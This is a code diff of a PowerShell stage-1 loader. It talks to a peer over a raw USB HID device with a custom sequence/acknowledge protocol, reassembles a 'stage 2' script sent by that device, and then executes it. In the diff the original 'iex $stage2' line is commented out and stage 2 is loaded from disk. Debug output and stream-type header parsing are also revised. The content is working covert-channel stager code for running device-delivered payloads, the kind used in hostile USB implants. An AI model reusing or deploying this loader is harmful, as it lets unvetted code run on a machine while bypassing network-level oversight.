@@ -220,8 +220,8 @@ function RequestStage2 ($HIDin, $HIDout) {
     $connect_req[2] = $connect_req[2] -bor 128 # set CONNECT BIT
 
     
-    [Console]::WriteLine("Starting connection synchronization..")
-    
+[Console]::WriteLine("Stage1: Starting connection synchronization..")
+   
     $connected = $false
     while (-not $connected)
     {
@@ -229,7 +229,7 @@ function RequestStage2 ($HIDin, $HIDout) {
         # the CONNECT BIT tells the peer to flush its outbound queue
         # this did ONLY happen, if we receive a report with CONNECT BIT SET (holding the initial sequence number)
         $HIDout.Write($connect_req, 0, 65) # This repoert holds has ACK=0 which should be ignored by the server
-        [Console]::WriteLine("Connect request sent")
+[Console]::WriteLine("Stage1: Connect request sent")
 
         $cr = $HIDin.Read($response, 0, 65)
         $SEQ = $response[2] -band 63
@@ -240,7 +240,7 @@ function RequestStage2 ($HIDin, $HIDout) {
 
         if ($CONNECT_BIT)
         {
-            [Console]::WriteLine("SEQ {0} received on connect" -f $SEQ)
+            [Console]::WriteLine("Satge1: Synced to SEQ number {0}" -f $SEQ)
             # this is the initial SEQ number, send corresponding ACK and exit loop
             $connect_req[2] = $connect_req[2] -bor $SEQ # set ACK to SEQ
             $HIDout.Write($connect_req, 0, 65)
@@ -263,7 +263,8 @@ function RequestStage2 ($HIDin, $HIDout) {
     
     
     # construct report (REPORT ID 0, LEN=62, FIN=true, payload[]=62*0x00)
-    $STREAM_TYPE_STAGE2_REQUEST = [int] 1
+    #$STREAM_TYPE_STAGE2_REQUEST = [int] 1
+    $STREAM_TYPE_STAGE2_REQUEST = [byte] 1 + (1 -shl 4) # CHANNEL_TYPE_CONTROL, SUBTYPE_CLIENT_STAGE2_REQUEST
     $payload = [BitConverter]::GetBytes($STREAM_TYPE_STAGE2_REQUEST)
     $LEN = $payload.Length
     $FIN_BIT = (1 -shl 7) # set FIN BIT
@@ -277,51 +278,60 @@ function RequestStage2 ($HIDin, $HIDout) {
     # miss something).
 
     
+    
     $stage2 = $null
+    $STREAM_TYPE_STAGE2_RESPONSE = [byte] 1 + (1 -shl 4) # CHANNEL_TYPE_CONTROL, SUBTYPE_SERVER_STAGE2_RESPONSE
     while ($true)
     {
         $cr = $HIDin.Read($response, 0, 65)
         $SEQ = $response[2] -band 63 # should be former SEQ+1, but we don't handle error case
-        $ACK = $SEQ
         $LEN = $response[1] -band 63
+        
+        
+
+#[Console]::WriteLine("Stage1: Received SEQ {0}, LAST_SEQ {1}" -f ($SEQ, $LAST_SEQ))
 
         # check if response contains data
         if ($LEN -gt 0)
         {
-            # check the first report of stage 2
+#[Console]::WriteLine("Stage1: $response")
+            $stream_type = $response[3] # contains channel_type + channel_subtype
+            $host.UI.WriteLine("Stage 1: StreamType {0}" -f $stream_type)
+            # check the first report of stage 2 still unreceived
             if ($stage2 -eq $null)
             {
-                # check if stage 2 response
-                $stream_type = [BitConverter]::ToUInt32($response, 3)
-                if ($stream_type -eq $STREAM_TYPE_STAGE2_REQUEST)
+                # check if stage 2 response stream type
+                
+                if ($stream_type -eq $STREAM_TYPE_STAGE2_RESPONSE)
                 {
-                    $stage2 = $response[7..(2+$LEN)]
+                    $stage2 = $response[4..(2+$LEN)] # omit header bytes (0 = ID, 1 = LEN/FIN, 2 = SEQ, 3 = CHANNEL TYPE / SUBTYPE)           
                 }
                 else
                 {
-                    "Error on receiving stage 2, wrong type"
+                    $host.UI.WriteLine("Error on receiving stage 2, wrong type in first report. Skipping this stream...")
                 }
             }
             else
             {
                 # not first report, append data
-                $stage2 += $response[3..(2+$LEN)]
+                $stage2 += $response[3..(2+$LEN)] # CHANNEL TYPE not contained in ongoing stream
             }
 
+            # end stage 2 reassembling if FIN bit is set
             $FIN_BIT = $response[1] -band 128
-
-            # if FIN BIT is set, we are done
-            if ($FIN_BIT) { break }
+            if ($FIN_BIT -and $stage2 -ne $null) { break }
         }
 
+        # send empty response with valid ACK forst last SEQ received (stop-and-wait)
         $request = New-Object Byte[] 65
+        $ACK = $SEQ
         $request[2] = $ACK
-        # send empty response with valid ACK
         $HIDout.Write($request, 0, 65)
     }
 
     # if we got here, we have stage 2 represented as byte array...needs to be converted to UTF8
     $stage2 = [Text.Encoding]::UTF8.GetString($stage2)
+
     return $stage2
 }
 
@@ -335,7 +345,8 @@ $HIDout = $devfile
 
 $stage2 = RequestStage2 $HIDin $HIDout 1 # synchronize connection
 
+"$stage2"
 
 $stage2 = Get-Content fullduplex_stage2.ps1 | Out-String # we load stage 2 from disk
 
-iex $stage2
+#iex $stage2
